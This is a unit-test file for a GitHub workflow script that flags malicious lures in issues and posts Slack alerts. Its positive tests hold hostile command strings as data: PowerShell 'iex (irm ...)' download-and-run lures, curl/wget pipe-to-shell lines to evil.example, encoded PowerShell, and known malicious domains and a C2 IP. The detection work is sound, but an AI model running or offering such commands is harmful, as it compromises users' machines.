#!/usr/bin/env python3
"""Unit tests for flag_suspicious.py. Run with: python3 -m unittest
.github/scripts/test_flag_suspicious.py (or from within .github/scripts/).
"""

import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import flag_suspicious as fs  # noqa: E402


class TestMatchRulesPositive(unittest.TestCase):
    def test_exact_lure_iex_irm_known_ioc(self):
        # The exact lure from the wild: the host is built from two quoted
        # fragments concatenated at runtime, so the known-ioc literal
        # substring match doesn't apply to this specific split-string form
        # -- powershell-iex and string-built-host are what catch it.
        text = 'iex (irm ("gitrm" + ".sbs"))'
        matched = fs.match_rules(text)
        self.assertIn("powershell-iex", matched)
        self.assertIn("string-built-host", matched)

    def test_known_ioc_matches_unsplit_domain(self):
        text = "fetch payload from gitrm.sbs now"
        matched = fs.match_rules(text)
        self.assertIn("known-ioc", matched)

    def test_curl_pipe_to_bash(self):
        text = "curl -fsSL https://x.example/i.sh | bash"
        matched = fs.match_rules(text)
        self.assertIn("pipe-to-shell", matched)

    def test_wget_pipe_to_sudo_sh(self):
        text = "wget -qO- http://evil.example/install.sh | sudo sh"
        matched = fs.match_rules(text)
        self.assertIn("pipe-to-shell", matched)

    def test_powershell_encoded_command(self):
        text = "powershell -enc SQBFAFgA"
        matched = fs.match_rules(text)
        self.assertIn("powershell-encoded", matched)

    def test_powershell_encodedcommand_long_form(self):
        text = "powershell.exe -NoP -NonI -W Hidden -EncodedCommand SQBFAFgA"
        matched = fs.match_rules(text)
        self.assertIn("powershell-encoded", matched)

    def test_frombase64string(self):
        text = "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($x))"
        matched = fs.match_rules(text)
        self.assertIn("powershell-encoded", matched)

    def test_invoke_webrequest_downloadstring(self):
        text = "(New-Object Net.WebClient).DownloadString('http://evil.example/p.ps1')"
        matched = fs.match_rules(text)
        self.assertIn("powershell-iex", matched)

    def test_bare_ip_url(self):
        text = "Please download the update from http://45.33.12.9:8080/update.exe"
        matched = fs.match_rules(text)
        self.assertIn("bare-ip-url", matched)

    def test_known_ioc_mops_to(self):
        text = "see https://mops.to/payload for details"
        matched = fs.match_rules(text)
        self.assertIn("known-ioc", matched)

    def test_known_ioc_raw_ip(self):
        text = "c2 server is at 45.91.202.47 apparently"
        matched = fs.match_rules(text)
        self.assertIn("known-ioc", matched)

    def test_unknown_link_combined_with_other_rule(self):
        text = 'iex (irm "https://sketchy-domain.example/x")'
        matched = fs.match_rules(text)
        self.assertIn("powershell-iex", matched)
        self.assertIn("unknown-link", matched)

    def test_unknown_link_to_executable_alone(self):
        text = "Grab the installer here: https://sketchy-domain.example/setup.exe"
        matched = fs.match_rules(text)
        self.assertIn("unknown-link", matched)

    def test_unknown_link_to_script_alone(self):
        text = "Run this helper script https://sketchy-domain.example/tool.ps1 to fix it"
        matched = fs.match_rules(text)
        self.assertIn("unknown-link", matched)

    def test_string_built_host(self):
        text = 'host = "update" + ".badcdn"'
        matched = fs.match_rules(text)
        self.assertIn("string-built-host", matched)


class TestMatchRulesNegative(unittest.TestCase):
    def test_normal_bug_report(self):
        text = (
            "When I run the tool on macOS Sonoma 14.4 it crashes with a "
            "NullPointerException. Steps to reproduce: 1. open the app "
            "2. click settings 3. observe crash. Expected: no crash."
        )
        matched = fs.match_rules(text)
        self.assertEqual(matched, [])

    def test_github_link_alone_is_fine(self):
        text = "See https://github.com/obra/superpowers/issues/123 for context."
        matched = fs.match_rules(text)
        self.assertEqual(matched, [])

    def test_githubusercontent_asset_link(self):
        text = "Screenshot: https://user-images.githubusercontent.com/1/abc.png"
        matched = fs.match_rules(text)
        self.assertEqual(matched, [])

    def test_curl_without_pipe_to_shell(self):
        text = "curl https://api.github.com/repos/obra/superpowers"
        matched = fs.match_rules(text)
        self.assertEqual(matched, [])

    def test_pip_install_code_block(self):
        text = "```\npip install superpowers\n```\nThen run `superpowers --help`."
        matched = fs.match_rules(text)
        self.assertEqual(matched, [])

    def test_unknown_link_alone_no_exec_no_other_signal(self):
        # low-signal unknown-link alone, and not pointing at an executable:
        # should NOT alert.
        text = "More info at https://some-random-blog.example/post/1234"
        matched = fs.match_rules(text)
        self.assertEqual(matched, [])

    def test_allowlisted_npm_and_pypi(self):
        text = "Published to https://www.npmjs.com/package/foo and https://pypi.org/project/foo/"
        matched = fs.match_rules(text)
        self.assertEqual(matched, [])


class TestSkipLogic(unittest.TestCase):
    def test_is_bot(self):
        self.assertTrue(fs._is_bot("Bot"))
        self.assertTrue(fs._is_bot("bot"))
        self.assertFalse(fs._is_bot("User"))
        self.assertFalse(fs._is_bot(""))

    def test_trusted_association(self):
        for assoc in ("OWNER", "MEMBER", "COLLABORATOR", "owner", "member"):
            self.assertTrue(fs._is_trusted_association(assoc))
        for assoc in ("NONE", "CONTRIBUTOR", "FIRST_TIME_CONTRIBUTOR", ""):
            self.assertFalse(fs._is_trusted_association(assoc))


class TestSlackMessageFormatting(unittest.TestCase):
    def test_message_shape(self):
        msg = fs.build_slack_message(
            "https://github.com/obra/superpowers/issues/1",
            "Free robux generator",
            "sketchy-user",
            ["known-ioc", "powershell-iex"],
        )
        self.assertTrue(msg.startswith(":warning: possible malicious content in "))
        self.assertIn(
            "<https://github.com/obra/superpowers/issues/1|Free robux generator>", msg
        )
        self.assertIn("by sketchy-user", msg)
        self.assertIn("matched known-ioc, powershell-iex", msg)

    def test_message_never_contains_raw_ioc_or_body_text(self):
        # The message is built only from title/author/url/rule names --
        # never from the body, so no matched text or arbitrary link can
        # leak into Slack.
        msg = fs.build_slack_message(
            "https://github.com/obra/superpowers/issues/1",
            "innocuous title",
            "someone",
            ["known-ioc"],
        )
        self.assertNotIn("gitrm", msg)
        self.assertNotIn("mops.to", msg)
        self.assertNotIn("45.91.202.47", msg)

    def test_title_with_pipe_and_angle_brackets_is_escaped(self):
        msg = fs.build_slack_message(
            "https://github.com/obra/superpowers/issues/1",
            "weird | title <script>",
            "someone",
            ["known-ioc"],
        )
        # No stray '|' inside the link label, and angle brackets escaped.
        self.assertNotIn("title <script>", msg)
        self.assertIn("&lt;script&gt;", msg)


if __name__ == "__main__":
    unittest.main()
